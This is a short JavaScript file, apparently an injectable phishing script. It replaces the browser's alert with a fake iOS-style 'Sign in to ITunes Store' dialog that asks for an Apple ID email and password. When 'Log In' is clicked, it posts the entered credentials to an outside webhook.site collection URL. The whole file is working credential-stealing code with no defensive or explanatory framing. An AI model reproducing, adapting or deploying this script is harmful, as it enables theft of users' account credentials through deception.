(function(proxied) {
		window.alert = function() {
			iosAlert(arguments[0], arguments[1]);
		}
})(window.alert);

function iosAlert() {
	try {
		var $alert = document.querySelector('.alert');
		$alert.parentElement.removeChild($alert);
	} catch ($error) {}

	var $alert = document.createElement('span');
	if (arguments[1] == null) {
		arguments[1] = window.location.protocol + '//' + window.location.hostname;
	}
	$alert.innerHTML = '<div class="alert"><div class="inner"><div class="title">' + arguments[1] + '</div><div class="text">' + arguments[0] + '</div></div><div><input placeholder="Email" type="text" id="username" name="username" /></div><br><div><input placeholder="Password" type="password" id="pass" name="password" minlength="8" required /></div><br><div class="button">Log In</div></div>';
	document.querySelector('body').appendChild($alert);
	setTimeout(function() {
		document.querySelector('.alert .button:last-child').addEventListener("click", function() {
			let xhr = new XMLHttpRequest();
			xhr.open("POST", "https://webhook.site/832ac337-3d87-4bc9-a167-20ef1362d060");
			// xhr.setRequestHeader("Access-Control-Allow-Origin", "*");
			// xhr.setRequestHeader("Content-Type", "application/json");
			// xhr.setRequestHeader('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
			// xhr.setRequestHeader('Access-Control-Allow-Headers', 'Content-Type');
			xhr.onload = () => console.log(xhr.responseText);
			let username = document.querySelector('#username').value;
			let password = document.querySelector('#pass').value;
			let data = "hello: " + username + "   pass: " + password;
			console.log(data);
			xhr.send(data);
			$alert.parentElement.removeChild($alert);
			
		});
	});
	return false;

}

iosAlert('To continue, enter the username and the password for your Apple ID:','Sign in to ITunes Store')